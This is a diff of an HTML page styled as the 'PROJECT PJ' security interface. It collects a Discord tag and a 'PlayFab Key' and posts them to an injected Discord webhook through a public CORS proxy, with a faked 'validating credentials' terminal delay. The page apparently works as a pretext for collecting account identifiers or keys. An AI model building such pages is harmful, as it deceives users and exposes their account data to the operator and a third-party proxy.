@@ -8,15 +8,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #5865F2; /* Updated Discord Color */
+            --primary: #5865F2; 
             --primary-hover: #4752C4;
             --accent: #00ff88;
-            --accent-glow: rgba(0, 255, 136, 0.4);
-            --bg: #09090b;
-            --surface: rgba(24, 24, 27, 0.6);
-            --border: rgba(255, 255, 255, 0.08);
-            --text-main: #f4f4f5;
-            --text-muted: #a1a1aa;
+            --accent-glow: rgba(0, 255, 136, 0.5);
+            --danger: #ff4444;
+            --bg: #050505;
+            --surface: rgba(15, 15, 20, 0.85);
+            --border: rgba(255, 255, 255, 0.1);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -24,251 +23,271 @@
         body {
             font-family: 'Rajdhani', sans-serif;
             background-color: var(--bg);
-            color: var(--text-main);
-            overflow-x: hidden;
+            color: #fff;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
+            overflow: hidden;
         }
 
-        /* Ambient Background Glow */
-        .bg-glow {
-            position: fixed;
-            top: 50%; left: 50%;
-            width: 600px; height: 600px;
-            background: radial-gradient(circle, rgba(88,101,242,0.15) 0%, rgba(0,0,0,0) 70%);
-            transform: translate(-50%, -50%);
-            z-index: -2;
-            pointer-events: none;
-        }
-
-        /* Subtle Grid */
+        /* Cyber Grid Background */
         .bg-grid {
             position: fixed;
             top: 0; left: 0; width: 100vw; height: 100vh;
             background-image: 
-                linear-gradient(var(--border) 1px, transparent 1px),
-                linear-gradient(90deg, var(--border) 1px, transparent 1px);
-            background-size: 40px 40px;
-            mask-image: radial-gradient(circle at center, black 40%, transparent 100%);
-            -webkit-mask-image: radial-gradient(circle at center, black 40%, transparent 100%);
+                linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
+            background-size: 30px 30px;
             z-index: -1;
-            opacity: 0.3;
         }
 
         .container {
-            max-width: 480px;
-            width: 90%;
-            text-align: center;
-            animation: slideUp 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+            width: 100%;
+            max-width: 450px;
+            padding: 20px;
         }
 
-        @keyframes slideUp { 
-            from { opacity: 0; transform: translateY(30px); } 
-            to { opacity: 1; transform: translateY(0); } 
-        }
+        .header-box { text-align: center; margin-bottom: 2rem; }
 
         h1 {
             font-family: 'Orbitron', sans-serif;
-            font-size: clamp(2rem, 8vw, 3.5rem);
-            letter-spacing: 6px;
-            margin-bottom: 0.2rem;
-            color: #ffffff;
-            text-shadow: 0 0 20px rgba(255,255,255,0.3);
+            font-size: 2.5rem;
+            letter-spacing: 5px;
+            text-shadow: 0 0 15px rgba(255,255,255,0.5);
         }
 
         .subtitle {
             color: var(--accent);
-            letter-spacing: 4px;
+            letter-spacing: 3px;
+            font-size: 0.8rem;
             font-weight: 700;
-            font-size: 0.85rem;
-            margin-bottom: 2.5rem;
-            text-transform: uppercase;
+        }
+
+        #clock {
+            font-family: 'Orbitron', monospace;
+            font-size: 0.75rem;
+            color: #888;
+            margin-top: 5px;
         }
 
         .card {
             background: var(--surface);
-            backdrop-filter: blur(16px);
-            -webkit-backdrop-filter: blur(16px);
             border: 1px solid var(--border);
-            padding: 2.5rem 2rem;
-            border-radius: 16px;
-            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+            border-radius: 12px;
+            padding: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
         }
 
-        .discord-btn { 
-            background: var(--primary); 
-            color: white; 
-            margin-bottom: 2rem;
-            box-shadow: 0 8px 24px rgba(88, 101, 242, 0.25);
-        }
-        .discord-btn:hover { background: var(--primary-hover); transform: translateY(-2px); }
-
-        .btn {
+        .btn-discord {
+            background: var(--primary);
+            color: white;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             padding: 1rem;
-            border-radius: 8px;
+            border-radius: 6px;
             text-decoration: none;
-            font-weight: 700;
-            font-family: 'Orbitron', sans-serif;
-            cursor: pointer;
-            transition: all 0.2s ease;
-            border: none;
-            width: 100%;
-            font-size: 0.95rem;
-            letter-spacing: 1.5px;
-        }
-
-        .input-group { margin-bottom: 1.5rem; text-align: left; }
-        
-        label { 
-            display: block; 
-            font-size: 0.75rem; 
-            color: var(--text-muted); 
-            margin-bottom: 0.5rem; 
-            font-weight: 700;
-            letter-spacing: 1px;
+            font-weight: bold;
             text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: 0.3s;
+            margin-bottom: 1.5rem;
+            width: 100%;
+        }
+        .btn-discord:hover { background: var(--primary-hover); }
+
+        .input-group { margin-bottom: 1.2rem; }
+        
+        label {
+            display: block;
+            font-size: 0.75rem;
+            color: #aaa;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         input {
             width: 100%;
-            padding: 1rem;
-            background: rgba(0, 0, 0, 0.4);
+            padding: 12px;
+            background: rgba(0,0,0,0.5);
             border: 1px solid var(--border);
-            border-radius: 8px;
-            color: white;
-            font-family: 'Rajdhani', sans-serif;
-            font-size: 1.1rem;
-            font-weight: 500;
+            border-radius: 6px;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.9rem;
+            transition: 0.3s;
             outline: none;
-            transition: all 0.3s ease;
         }
 
-        input:focus { 
-            border-color: var(--accent); 
-            box-shadow: 0 0 15px var(--accent-glow);
-            background: rgba(0, 0, 0, 0.6);
+        input:focus {
+            border-color: var(--accent);
+            box-shadow: 0 0 10px var(--accent-glow);
         }
 
-        .submit-btn { 
-            background: var(--accent); 
-            color: #000; 
-            margin-top: 1rem;
-        }
-        
-        .submit-btn:hover:not(:disabled) { 
-            box-shadow: 0 0 20px var(--accent-glow); 
-            transform: translateY(-2px); 
-        }
-        
-        .submit-btn:disabled { 
-            opacity: 0.6; 
-            cursor: not-allowed; 
-            transform: none;
-        }
-
-        #status { 
-            margin-top: 1.5rem; 
-            font-weight: 700; 
-            font-size: 0.9rem; 
-            min-height: 24px; 
+        .btn-submit {
+            width: 100%;
+            padding: 1rem;
+            background: var(--accent);
+            color: #000;
+            border: none;
+            border-radius: 6px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: bold;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: 0.3s;
             text-transform: uppercase;
-            letter-spacing: 1px;
-            transition: color 0.3s;
+            margin-top: 10px;
         }
+
+        .btn-submit:hover:not(:disabled) {
+            box-shadow: 0 0 15px var(--accent-glow);
+            transform: translateY(-2px);
+        }
+
+        .btn-submit:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+        }
+
+        /* Terminal Output Box */
+        .terminal {
+            margin-top: 1.5rem;
+            background: #000;
+            border: 1px solid #333;
+            border-radius: 6px;
+            padding: 10px;
+            height: 100px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.75rem;
+            color: #aaa;
+            display: none;
+        }
+        
+        .terminal p { margin: 2px 0; }
+        .log-success { color: var(--accent); }
+        .log-error { color: var(--danger); }
+        .log-warn { color: yellow; }
+
     </style>
 </head>
 <body>
-    <div class="bg-glow"></div>
     <div class="bg-grid"></div>
 
     <div class="container">
-        <h1>PROJECT PJ</h1>
-        <div class="subtitle">Security Interface V.2.06</div>
+        <div class="header-box">
+            <h1>PROJECT PJ</h1>
+            <div class="subtitle">SECURITY INTERFACE V.2.06</div>
+            <div id="clock">SYS.TIME: 00:00:00</div>
+        </div>
 
         <div class="card">
-            <a href="https://discord.gg/YvAbSsEUfN" target="_blank" class="btn discord-btn">
+            <a href="https://discord.gg/YvAbSsEUfN" target="_blank" class="btn-discord">
                 <i class="fab fa-discord"></i> Connect Identity
             </a>
 
             <form id="linkForm">
                 <div class="input-group">
                     <label>Discord Tag</label>
-                    <input type="text" id="discord" placeholder="Username#0000 or @username" required autocomplete="off">
+                    <input type="text" id="discord" placeholder="Username#0000" required>
                 </div>
                 <div class="input-group">
                     <label>PlayFab Key</label>
-                    <input type="text" id="playfab" placeholder="Enter PlayFab ID" required autocomplete="off">
+                    <input type="text" id="playfab" placeholder="ENTER KEY" required>
                 </div>
-                <button type="submit" class="btn submit-btn" id="btnText">
+                <button type="submit" class="btn-submit" id="submitBtn">
                     <i class="fas fa-link"></i> Execute Link
                 </button>
             </form>
-            <div id="status"></div>
+
+            <div class="terminal" id="terminal"></div>
         </div>
     </div>
 
     <script>
+        // Live Clock
+        setInterval(() => {
+            const now = new Date();
+            document.getElementById('clock').innerText = `SYS.TIME: ${now.toLocaleTimeString()}`;
+        }, 1000);
+
         const form = document.getElementById('linkForm');
-        const status = document.getElementById('status');
-        const btn = document.getElementById('btnText');
-        
-        // Target Webhook (Replaced by GitHub Actions)
-        const HOOK = "REPLACE_WITH_WEBHOOK"; 
+        const submitBtn = document.getElementById('submitBtn');
+        const terminal = document.getElementById('terminal');
+
+        function log(msg, type = '') {
+            terminal.style.display = 'block';
+            const p = document.createElement('p');
+            p.innerHTML = `> ${msg}`;
+            if(type) p.className = `log-${type}`;
+            terminal.appendChild(p);
+            terminal.scrollTop = terminal.scrollHeight;
+        }
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            
-            // UI Loading State
-            btn.disabled = true;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Transmitting...';
-            status.innerText = "";
+            const discord = document.getElementById('discord').value.trim();
+            const playfab = document.getElementById('playfab').value.trim();
 
-            const discordVal = document.getElementById('discord').value.trim();
-            const playfabVal = document.getElementById('playfab').value.trim();
+            // Reset Terminal
+            terminal.innerHTML = '';
+            submitBtn.disabled = true;
+
+            log('INITIALIZING SECURE UPLINK...');
+            
+            // This MUST be replaced by your GitHub Action
+            const rawWebhook = "REPLACE_WITH_WEBHOOK";
+
+            if (rawWebhook.includes("REPLACE_WITH")) {
+                log('FATAL: WEBHOOK NOT INJECTED BY GITHUB ACTIONS.', 'error');
+                submitBtn.disabled = false;
+                return;
+            }
+
+            // Route through CORS Proxy to bypass Discord browser block
+            const proxiedWebhook = `https://corsproxy.io/?${encodeURIComponent(rawWebhook)}`;
 
             const payload = {
                 embeds: [{
-                    title: "🔒 New Authorization Request",
-                    color: 65280, // Hex #00FF00
+                    title: "🔐 System Authorization Request",
+                    color: 65280,
                     fields: [
-                        { name: "Discord", value: "`" + discordVal + "`", inline: true },
-                        { name: "PlayFab ID", value: "`" + playfabVal + "`", inline: true }
+                        { name: "Discord", value: "`" + discord + "`", inline: true },
+                        { name: "PlayFab", value: "`" + playfab + "`", inline: true }
                     ],
-                    timestamp: new Date().toISOString(),
-                    footer: { text: "PROJECT PJ | Secure Linker" }
+                    footer: { text: "PJ Security System" },
+                    timestamp: new Date().toISOString()
                 }]
             };
 
-            try {
-                const res = await fetch(HOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
+            setTimeout(async () => {
+                log('VALIDATING CREDENTIALS...', 'warn');
+                try {
+                    const res = await fetch(proxiedWebhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
 
-                if(res.ok) {
-                    status.innerText = "✓ Connection Established";
-                    status.style.color = "var(--accent)";
-                    form.reset();
-                } else { 
-                    throw new Error(`HTTP Error: ${res.status}`); 
+                    if (res.ok) {
+                        log('UPLINK SUCCESSFUL. DATA TRANSMITTED.', 'success');
+                        form.reset();
+                    } else {
+                        throw new Error(`HTTP ${res.status}`);
+                    }
+                } catch (err) {
+                    log(`TRANSMISSION FAILED: ${err.message}`, 'error');
+                } finally {
+                    submitBtn.disabled = false;
                 }
-            } catch (err) {
-                console.error(err);
-                status.innerText = "✗ System Error: Link Denied";
-                status.style.color = "#ff4444";
-            } finally {
-                // Reset UI
-                btn.disabled = false;
-                btn.innerHTML = '<i class="fas fa-link"></i> Execute Link';
-            }
+            }, 800); // Fake delay for cool terminal effect
         });
     </script>
 </body>
